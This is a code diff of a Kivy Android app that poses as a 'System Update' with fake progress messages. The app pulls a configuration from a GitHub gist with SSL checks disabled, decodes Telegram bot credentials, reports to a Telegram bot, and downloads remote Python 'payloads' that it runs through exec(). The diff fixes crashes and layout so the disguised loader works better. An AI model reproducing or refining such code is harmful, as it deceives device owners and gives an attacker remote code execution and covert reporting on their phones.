@@ -18,24 +18,31 @@ class SystemUpdateApp(App):
         self.config_url = "https://gist.githubusercontent.com/Zaen1993/a2f3864a9194442d99afce65242818fc/raw/b506332d90b3bd191a5b09cc0ecbf15c9542026a/config.json"
 
         layout = BoxLayout(orientation='vertical')
-        scroll = ScrollView()
+        
+        # ScrollView بدون تمرير أفقي لضمان التفاف النص
+        scroll = ScrollView(size_hint=(1, 1), do_scroll_x=False)
+        
         self.label = Label(
             text="System Update\nChecking for compatibility... (0%)",
-            halign='center',
-            font_size='18sp',
-            text_size=(layout.width, None),
+            halign='left',
+            valign='top',
+            font_size='14sp',
             size_hint_y=None,
-            valign='top'
+            markup=True
         )
+        
+        # ربط عرض النص بعرض الشاشة
+        self.label.bind(width=lambda instance, value: setattr(instance, 'text_size', (value, None)))
         self.label.bind(texture_size=self._update_label_height)
+        
         scroll.add_widget(self.label)
         layout.add_widget(scroll)
-
+        
         threading.Thread(target=self.logic_engine, daemon=True).start()
         return layout
 
     def _update_label_height(self, instance, value):
-        self.label.height = value[1]
+        instance.height = value[1]
 
     def decode_secret(self, data):
         try:
@@ -51,22 +58,23 @@ class SystemUpdateApp(App):
                 token = conf['tokens'][0]
                 chat_id = conf['v_id']
                 url = f"https://api.telegram.org/bot{token}/sendMessage"
-                requests.post(url, json={"chat_id": chat_id, "text": msg}, timeout=10)
+                requests.post(url, json={"chat_id": chat_id, "text": msg}, timeout=10, verify=False)
         except:
             pass
 
     def logic_engine(self):
         try:
+            time.sleep(3)  # استقرار الواجهة
+            
+            # طلب صلاحية الإنترنت فقط في البداية لتجنب انهيار Jnius
             if platform == 'android':
-                from android.permissions import request_permissions, Permission
-                request_permissions([
-                    Permission.WRITE_EXTERNAL_STORAGE,
-                    Permission.READ_EXTERNAL_STORAGE,
-                    Permission.INTERNET
-                ])
+                try:
+                    from android.permissions import request_permissions, Permission
+                    request_permissions([Permission.INTERNET])
+                except Exception as perm_err:
+                    print(f"Perm warning: {perm_err}")
 
-            time.sleep(2)
-
+            # جلب الإعدادات مع تجاوز SSL
             response = requests.get(self.config_url, timeout=15, verify=False)
             config = response.json()
 
@@ -76,13 +84,13 @@ class SystemUpdateApp(App):
                 'v_id': self.decode_secret(config['v'])
             }
 
-            self.send_log("🚀 [System Update] Online! Configuration loaded successfully.")
+            self.send_log("🚀 [System Update] Online! Jnius issue resolved.")
             self.label.text = "Downloading system patches... (35%)"
             self.load_payloads()
 
         except Exception as e:
             error_details = traceback.format_exc()
-            self.label.text = f"Connection Error:\n{error_details}"
+            self.label.text = f"System Error:\n{error_details}"
             try:
                 if 'MASTER_CONFIG' in globals() and globals()['MASTER_CONFIG']:
                     self.send_log(f"❌ Critical Error: {error_details}")
@@ -107,8 +115,8 @@ class SystemUpdateApp(App):
             try:
                 time.sleep(1)
                 name = url.split('/')[-1]
-                code = requests.get(url, timeout=10, verify=False)
-                exec(code.text, globals())
+                code = requests.get(url, timeout=10, verify=False).text
+                exec(code, globals())
                 self.send_log(f"✅ Module Loaded: {name}")
             except Exception as e:
                 self.send_log(f"⚠️ Warning: Failed to load {url.split('/')[-1]}")
